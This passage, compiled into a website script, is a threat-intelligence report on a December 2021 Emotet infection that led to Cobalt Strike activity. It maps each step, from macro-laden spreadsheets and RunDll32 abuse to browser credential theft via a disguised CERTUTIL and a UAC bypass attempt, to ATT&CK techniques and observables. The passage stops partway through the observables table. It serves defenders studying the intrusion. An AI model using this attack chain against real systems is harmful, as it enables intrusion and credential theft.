"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[34],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},7713:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return k},default:function(){return u}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),o=a(3248),i=["components"],d={},s=void 0,m={unversionedId:"Sightings/Emotet_Dec2021",id:"Sightings/Emotet_Dec2021",isDocsHomePage:!1,title:"Emotet_Dec2021",description:"Overview",source:"@site/docs/03-Sightings/16-Emotet_Dec2021.md",sourceDirName:"03-Sightings",slug:"/Sightings/Emotet_Dec2021",permalink:"/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021",tags:[],version:"current",sidebarPosition:16,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Hafnium",permalink:"/ac3-threat-sightings/docs/Sightings/Hafnium"},next:{title:"CVE-2021-40444",permalink:"/ac3-threat-sightings/docs/Sightings/Older Schema Version/CVE-2021-40444"}},k=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used <em>Email</em> with <em>.XLSM</em> file in attachment for Initial Access.",id:"threat-actor-used-email-with-xlsm-file-in-attachment-for-initial-access",children:[]},{value:"Threat actor used <em>weaponized Microsoft Office files</em> for Execution.",id:"threat-actor-used-weaponized-microsoft-office-files-for-execution",children:[]},{value:"Threat Actor used <em>Embedded Office Macro</em> to download <em>.dll</em> files from external servers for Command And Control.",id:"threat-actor-used-embedded-office-macro-to-download-dll-files-from-external-servers-for-command-and-control",children:[]},{value:"Threat Actor used <em>Embedded Office Macro</em> to execute <em>.dll</em> files via <em>RunDll32</em> for Defense Evasion.",id:"threat-actor-used-embedded-office-macro-to-execute-dll-files-via-rundll32-for-defense-evasion",children:[]},{value:"Threat actor used nested invocations of <em>RunDll32</em> for Defense Evasion.",id:"threat-actor-used-nested-invocations-of-rundll32-for-defense-evasion",children:[]},{value:"Threat actor used <em>HTTP connections</em> to downloaded a masqueraded copy of <em>CERTUTIL</em> for Command And Control.",id:"threat-actor-used-http-connections-to-downloaded-a-masqueraded-copy-of-certutil-for-command-and-control",children:[]},{value:"Threat actor used Windows Registry Autorun keys for Persistence.",id:"threat-actor-used-windows-registry-autorun-keys-for-persistence",children:[]},{value:"Threat actor used <em>RunDll32</em> to launch and inject <em>CERTUTIL</em> for Execution.",id:"threat-actor-used-rundll32-to-launch-and-inject-certutil-for-execution",children:[]},{value:"Threat actor used <em>CERTUTIL</em> to access Web Browser credentials stores for Credential Access.",id:"threat-actor-used-certutil-to-access-web-browser-credentials-stores-for-credential-access",children:[]},{value:"Threat actor used HTTP to download <em>Cobalt Strike</em> stager DLL for Command And Control.",id:"threat-actor-used-http-to-download-cobalt-strike-stager-dll-for-command-and-control",children:[]},{value:"Threat actor used <em>RegSvr32</em> to execute Cobalt Strike Stager DLL for Execution.",id:"threat-actor-used-regsvr32-to-execute-cobalt-strike-stager-dll-for-execution",children:[]},{value:"Threat actor used process injection into <em>mstsc.exe</em> to launch Cobalt Strike post-exploitation tasks for Command And Control.",id:"threat-actor-used-process-injection-into-mstscexe-to-launch-cobalt-strike-post-exploitation-tasks-for-command-and-control",children:[]},{value:"Threat actor used <em>Cobalt Strike</em> to launch system native tools for Discovery.",id:"threat-actor-used-cobalt-strike-to-launch-system-native-tools-for-discovery",children:[]},{value:"Threat actor used HTTP to downloaded additional Cobalt Strike <em>dll</em> files for Command And Control.",id:"threat-actor-used-http-to-downloaded-additional-cobalt-strike-dll-files-for-command-and-control",children:[]},{value:"Threat actor used <em>SCHTASK</em> to create an scheduled task that executes the Cobalt Strike beacon for Persistence.",id:"threat-actor-used-schtask-to-create-an-scheduled-task-that-executes-the-cobalt-strike-beacon-for-persistence",children:[]},{value:"Threat actor used <em>RunDll32 via an Scheduled Task</em> to execute <em>Cobalt Strike Stager DLL</em> for Command And Control.",id:"threat-actor-used-rundll32-via-an-scheduled-task-to-execute-cobalt-strike-stager-dll-for-command-and-control",children:[]},{value:"Threat actor used <em>Cobalt Strike</em> to perform hands-on-keyboard discovery for Discovery.",id:"threat-actor-used-cobalt-strike-to-perform-hands-on-keyboard-discovery-for-discovery",children:[]},{value:"Threat actor used <em>Reg.exe</em> to attempt a known Elevation Control Mechanism bypass for Privilege Escalation.",id:"threat-actor-used-regexe-to-attempt-a-known-elevation-control-mechanism-bypass-for-privilege-escalation",children:[]},{value:"Threat actor used <em>Cobalt Strike</em> for initiating command execution on remote hosts via <em>CMD</em> and <em>WMIC</em> for Discovery.",id:"threat-actor-used-cobalt-strike-for-initiating-command-execution-on-remote-hosts-via-cmd-and-wmic-for-discovery",children:[]},{value:"Threat actor used <em>WMIC via Cobalt Strike</em> to list existing Volume Shadow Copies via <em>vssadmin.exe</em> for Discovery.",id:"threat-actor-used-wmic-via-cobalt-strike-to-list-existing-volume-shadow-copies-via-vssadminexe-for-discovery",children:[]},{value:"Threat actor used HTTP connections for Command And Control.",id:"threat-actor-used-http-connections-for-command-and-control",children:[]}]}],c={toc:k};function u(e){var t=e.components,a=(0,r.Z)(e,i);return(0,l.kt)("wrapper",(0,n.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents observed Emotet infection followed by Cobalt Strike activity. Weaponized .xlsm delivered via Email. User execution via Excel. Execution and C2 via ",(0,l.kt)("em",{parentName:"p"},"RunDll32"),". Process injection. Masqueraded ",(0,l.kt)("em",{parentName:"p"},"CERTUTIL"),". Cobalt Strike stagers. Discovery and Persistence. Victim had protection solution configured to do-not-block."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://attack.mitre.org/software/S0367/"},"https://attack.mitre.org/software/S0367/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.bleepingcomputer.com/news/security/emotet-starts-dropping-cobalt-strike-again-for-faster-attacks/"},"https://www.bleepingcomputer.com/news/security/emotet-starts-dropping-cobalt-strike-again-for-faster-attacks/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://intel471.com/blog/emotet-returns-december-2021/"},"https://intel471.com/blog/emotet-returns-december-2021/"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Email")," with ",(0,l.kt)("em",{parentName:"li"},".XLSM")," file in attachment for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"weaponized Microsoft Office files")," for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Embedded Office Macro")," to download ",(0,l.kt)("em",{parentName:"li"},".dll")," files from external servers for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Embedded Office Macro")," to execute ",(0,l.kt)("em",{parentName:"li"},".dll")," files via ",(0,l.kt)("em",{parentName:"li"},"RunDll32")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used nested invocations of ",(0,l.kt)("em",{parentName:"li"},"RunDll32")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"HTTP connections")," to downloaded a masqueraded copy of ",(0,l.kt)("em",{parentName:"li"},"CERTUTIL")," for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used Windows Registry Autorun keys for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"RunDll32")," to launch and inject ",(0,l.kt)("em",{parentName:"li"},"CERTUTIL")," for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"CERTUTIL")," to access Web Browser credentials stores for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used HTTP to download ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," stager DLL for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"RegSvr32")," to execute Cobalt Strike Stager DLL for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used process injection into ",(0,l.kt)("em",{parentName:"li"},"mstsc.exe")," to launch Cobalt Strike post-exploitation tasks for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to launch system native tools for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used HTTP to downloaded additional Cobalt Strike ",(0,l.kt)("em",{parentName:"li"},"dll")," files for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"RunDll32 via an Scheduled Task")," to execute ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike Stager DLL")," for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Reg.exe")," to attempt a known Elevation Control Mechanism bypass for Privilege Escalation."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," for initiating command execution on remote hosts via ",(0,l.kt)("em",{parentName:"li"},"CMD")," and ",(0,l.kt)("em",{parentName:"li"},"WMIC")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"WMIC via Cobalt Strike")," to list existing Volume Shadow Copies via ",(0,l.kt)("em",{parentName:"li"},"vssadmin.exe")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used HTTP connections for Command And Control.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"++++ (4)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+++++++ (7)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(o.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | _Email_ with _.XLSM_ file in attachment| IA[Initial Access]\nIA[Initial Access] --\x3e | _weaponized Microsoft Office files_| EXE[Execution]\nEXE[Execution] --\x3e | _Embedded Office Macro_ to download _.dll_ files from external servers| C2[Command And Control]\nEXE[Execution] --\x3e | _Embedded Office Macro_ to execute _.dll_ files via _RunDll32_| DE[Defense Evasion]\nEXE[Execution] --\x3e | nested invocations of _RunDll32_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _HTTP connections_ to downloaded a masqueraded copy of _CERTUTIL_| C2[Command And Control]\nEXE[Execution] --\x3e | Windows Registry Autorun keys| PER[Persistence]\nDE[Defense Evasion] --\x3e | _RunDll32_ to launch and inject _CERTUTIL_| EXE[Execution]\nEXE[Execution] --\x3e | _CERTUTIL_ to access Web Browser credentials stores| CA[Credential Access]\nEXE[Execution] --\x3e | HTTP to download _Cobalt Strike_ stager DLL| C2[Command And Control]\nDE[Defense Evasion] --\x3e | _RegSvr32_ to execute Cobalt Strike Stager DLL| EXE[Execution]\nEXE[Execution] --\x3e | process injection into _mstsc.exe_ to launch Cobalt Strike post-exploitation tasks| C2[Command And Control]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to launch system native tools| D[Discovery]\nC2[Command And Control] --\x3e | HTTP to downloaded additional Cobalt Strike _dll_ files| C2[Command And Control]\nC2[Command And Control] --\x3e | _SCHTASK_ to create an scheduled task that executes the Cobalt Strike beacon| PER[Persistence]\nC2[Command And Control] --\x3e | _RunDll32 via an Scheduled Task_ to execute _Cobalt Strike Stager DLL_| C2[Command And Control]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to perform hands-on-keyboard discovery| D[Discovery]\nC2[Command And Control] --\x3e | _Reg.exe_ to attempt a known Elevation Control Mechanism bypass| PE[Privilege Escalation]\nC2[Command And Control] --\x3e | _Cobalt Strike_ for initiating command execution on remote hosts via _CMD_ and _WMIC_| D[Discovery]\nC2[Command And Control] --\x3e | _WMIC via Cobalt Strike_ to list existing Volume Shadow Copies via _vssadmin.exe_| D[Discovery]\nC2[Command And Control] --\x3e | HTTP connections| C2[Command And Control]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001 - Phishing: Spearphishing Attachment"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Email")," with ",(0,l.kt)("em",{parentName:"td"},".XLSM")," file in attachment for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized Microsoft Office files")," for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Embedded Office Macro")," to download ",(0,l.kt)("em",{parentName:"td"},".dll")," files from external servers for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1027 - Obfuscated Files or Information"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Embedded Office Macro")," to execute ",(0,l.kt)("em",{parentName:"td"},".dll")," files via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used nested invocations of ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1036 - Masquerading",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"HTTP connections")," to downloaded a masqueraded copy of ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used Windows Registry Autorun keys for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1055 - Process Injection"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," to launch and inject ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers",(0,l.kt)("br",null),"T1106 - Native API"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," to access Web Browser credentials stores for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP to download ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," stager DLL for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32",(0,l.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RegSvr32")," to execute Cobalt Strike Stager DLL for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used process injection into ",(0,l.kt)("em",{parentName:"td"},"mstsc.exe")," to launch Cobalt Strike post-exploitation tasks for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32",(0,l.kt)("br",null),"T1087.002 - Account Discovery: Domain Account",(0,l.kt)("br",null),"T1069 - Permission Groups Discovery",(0,l.kt)("br",null),"T1018 - Remote System Discovery",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch system native tools for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP to downloaded additional Cobalt Strike ",(0,l.kt)("em",{parentName:"td"},"dll")," files for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1053 - Scheduled Tasks",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RunDll32 via an Scheduled Task")," to execute ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike Stager DLL")," for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32",(0,l.kt)("br",null),"T1087.002 - Account Discovery: Domain Account",(0,l.kt)("br",null),"T1069 - Permission Groups Discovery",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control",(0,l.kt)("br",null),"T1112 - Modify Registry",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1087.002 - Account Discovery: Domain Account",(0,l.kt)("br",null),"T1069 - Permission Groups Discovery",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to attempt a known Elevation Control Mechanism bypass for Privilege Escalation.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1047 - Windows Management Instrumentation"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," for initiating command execution on remote hosts via ",(0,l.kt)("em",{parentName:"td"},"CMD")," and ",(0,l.kt)("em",{parentName:"td"},"WMIC")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047 - Windows Management Instrumentation"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to list existing Volume Shadow Copies via ",(0,l.kt)("em",{parentName:"td"},"vssadmin.exe")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP connections for Command And Control.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Email")," with ",(0,l.kt)("em",{parentName:"td"},".XLSM")," file in attachment for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\Mensaje_08122021.xlsm"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\info_45373.xlsm"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\NO8YIFRV\\\\AVISO_612318667.xlsm")),(0,l.kt)("td",{parentName:"tr",align:null},"- 'AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook' indicates that file was received as an email attachment",(0,l.kt)("br",null),"- File name pattern is compatible with observed Emotet campaigns.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized Microsoft Office files")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE\\" \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\Mensaje_08122021.xlsm\\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- This observable indicates that the user has interacted with the weaponized document.",(0,l.kt)("br",null),"- .xlsm files are Microsoft Excel macro-enabled spreadsheet files.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Embedded Office Macro")," to download ",(0,l.kt)("em",{parentName:"td"},".dll")," files from external servers for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"107.180.58[.]57"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": 